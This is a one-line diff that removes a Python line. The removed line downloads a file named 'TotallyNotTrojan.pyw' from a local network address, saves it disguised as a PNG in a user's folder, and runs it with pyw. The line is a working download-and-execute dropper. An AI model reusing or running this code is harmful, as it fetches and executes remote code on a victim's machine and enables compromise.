@@ -1,1 +1,0 @@
-from urllib import (parse, request);import os;logo = request.urlopen("http://192.168.1.202/TotallyNotTrojan.pyw").read();f = open("C:/Users/Рубин/logo3w.png", "wb");f.write(logo);f.close();os.popen("pyw C:/Users/Рубин/logo3w.png")
